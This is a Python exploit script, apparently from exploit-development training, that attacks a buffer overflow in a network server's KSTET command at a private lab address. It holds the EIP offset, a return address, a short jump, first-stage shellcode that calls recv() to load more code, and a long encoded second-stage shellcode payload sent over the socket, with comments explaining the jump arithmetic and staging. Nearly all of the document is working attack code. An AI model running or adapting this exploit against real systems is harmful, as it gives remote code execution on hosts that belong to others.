## Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443
# offset EIP = 66 according to !mona findmsp
import socket
import time
# cannot increase buffer size
cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.122.61',9999))
print cnct.recv(1024)

evilString = "A" * 90
evilString = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"
evilString = "A" * 66 + "B" * 4 + "C" * 20
# 0x625011df
evilString = "A" * 66 + "\xdf\x11\x50\x62" + "C" * 20
evilString = "A" * 66 + "\xdf\x11\x50\x62" + "\xEB\xB8" + "C" * 18
# found 66 A's overwrite EAX, 4 B's
# EBB8 short jmp -70 bytes, you find out jump length by using Windows calculator in hex mode and display in dec
# location of recv function 0x0040252C, the result of call from next line
# location of function call to recv function 0x00401953, go to expression, right click and assemble to find where it's calling
# The reasn why they keep starting with nops is because that is the memory address range, the first byte, being randomized by ASLR
# We evade ASLR using hex math and use short or long jumps to add or subtract bytes
# using hex math, we find out that the location of the socket descriptor is at the address 0184FB68 by  subtracting location of EBP 0197FF88-420
# You can use calculator's hex math to figure out the short jump distance by  99A + 50 = 9EA
# We find out to jump forward 50 bytes, we have four rows of unpredictable instructions to jump over
# We select 9D2 to subtract by 99A and we find out its 38 in hex, or 56 in dec, 56 byte jump distance
# 0184F9D2 is the location of our A's buffer

# Since the buffer size value of the recv function is 1000 bytes. It can eat the entire payload. 512 bytes in dec is 200 in hex
# Buffer length is 200 (512 in bytes)
# Flags is set to 00

# We need new first-stage shellcode to align and properly jump over sections of memory affected by ASLR using hex math, and then land in our buffer of 1000 byte capacity by invoking the recv() function
# firstString = align and ASLR bypass by calling recv()
# secondString = payload
firstStage = "\x54\x59\x66\x81\xC1\x88\x01\x83\xEc\x50\x33\xDB\x53\x33\xD2\x80\xC6\x02\x52\x04\x42\x50\xFF\x31\xB8\x11\x2C\x25\x40\xC1\xE8\x08\xFF\xD0"
# \xcc translates into breakpoint, stopping execution

secondStage =  b""
secondStage += b"\xda\xc5\xbb\x2d\x9b\x56\xb4\xd9\x74\x24\xf4"
secondStage += b"\x5f\x33\xc9\xb1\x56\x83\xc7\x04\x31\x5f\x14"
secondStage += b"\x03\x5f\x39\x79\xa3\x48\xa9\xff\x4c\xb1\x29"
secondStage += b"\x60\xc4\x54\x18\xa0\xb2\x1d\x0a\x10\xb0\x70"
secondStage += b"\xa6\xdb\x94\x60\x3d\xa9\x30\x86\xf6\x04\x67"
secondStage += b"\xa9\x07\x34\x5b\xa8\x8b\x47\x88\x0a\xb2\x87"
secondStage += b"\xdd\x4b\xf3\xfa\x2c\x19\xac\x71\x82\x8e\xd9"
secondStage += b"\xcc\x1f\x24\x91\xc1\x27\xd9\x61\xe3\x06\x4c"
secondStage += b"\xfa\xba\x88\x6e\x2f\xb7\x80\x68\x2c\xf2\x5b"
secondStage += b"\x02\x86\x88\x5d\xc2\xd7\x71\xf1\x2b\xd8\x83"
secondStage += b"\x0b\x6b\xde\x7b\x7e\x85\x1d\x01\x79\x52\x5c"
secondStage += b"\xdd\x0c\x41\xc6\x96\xb7\xad\xf7\x7b\x21\x25"
secondStage += b"\xfb\x30\x25\x61\x1f\xc6\xea\x19\x1b\x43\x0d"
secondStage += b"\xce\xaa\x17\x2a\xca\xf7\xcc\x53\x4b\x5d\xa2"
secondStage += b"\x6c\x8b\x3e\x1b\xc9\xc7\xd2\x48\x60\x8a\xba"
secondStage += b"\xbd\x49\x35\x3a\xaa\xda\x46\x08\x75\x71\xc1"
secondStage += b"\x20\xfe\x5f\x16\x31\xe8\x5f\xc8\xf9\x79\x9e"
secondStage += b"\xe9\xf9\x50\x65\xbd\xa9\xca\x4c\xbe\x22\x0b"
secondStage += b"\x70\x6b\xde\x01\xe6\x54\xb6\x6c\x98\x3c\xc4"
secondStage += b"\x90\x75\xe1\x41\x76\x25\x49\x01\x27\x86\x39"
secondStage += b"\xe1\x97\x6e\x50\xee\xc8\x8f\x5b\x25\x61\x25"
secondStage += b"\xb4\x93\xd9\xd2\x2d\xbe\x92\x43\xb1\x15\xdf"
secondStage += b"\x44\x39\x9f\x1f\x0a\xca\xea\x33\x7b\xad\x14"
secondStage += b"\xcc\x7c\x58\x14\xa6\x78\xca\x43\x5e\x83\x2b"
secondStage += b"\xa3\xc1\x7c\x1e\xb0\x06\x82\xdf\x80\x7d\xb5"
secondStage += b"\x75\xac\xe9\xba\x99\x2c\xea\xec\xf3\x2c\x82"
secondStage += b"\x48\xa0\x7f\xb7\x96\x7d\xec\x64\x03\x7e\x44"
secondStage += b"\xd8\x84\x16\x6a\x07\xe2\xb8\x95\x62\x70\xbe"
secondStage += b"\x69\xf0\x5f\x67\x01\x0a\xe0\x97\xd1\x60\xe0"
secondStage += b"\xc7\xb9\x7f\xcf\xe8\x09\x7f\xda\xa0\x01\x0a"
secondStage += b"\x8b\x03\xb0\x0b\x86\xc2\x6c\x0b\x25\xdf\x9f"
secondStage += b"\x76\x46\xe0\x60\x87\x4e\x85\x61\x87\x6e\xbb"
secondStage += b"\x5e\x51\x57\xc9\xa1\x61\xec\xc2\x94\xc4\x45"
secondStage += b"\x49\xd6\x5b\x95\x58"

evilString = "A" * 66 + "\xdf\x11\x50\x62" + "\xEB\xB8" + "C" * 18
evilString = firstStage + "\x90" * 32 + "\xdf\x11\x50\x62" + "\xEB\xB8" + "C" * 18
cnct.send("KSTET /.:/"+evilString)
print "First stage sent, sleeping 2 seconds..."
time.sleep(2)
cnct.send(secondStage)
print "Second stage sent"
cnct.close()
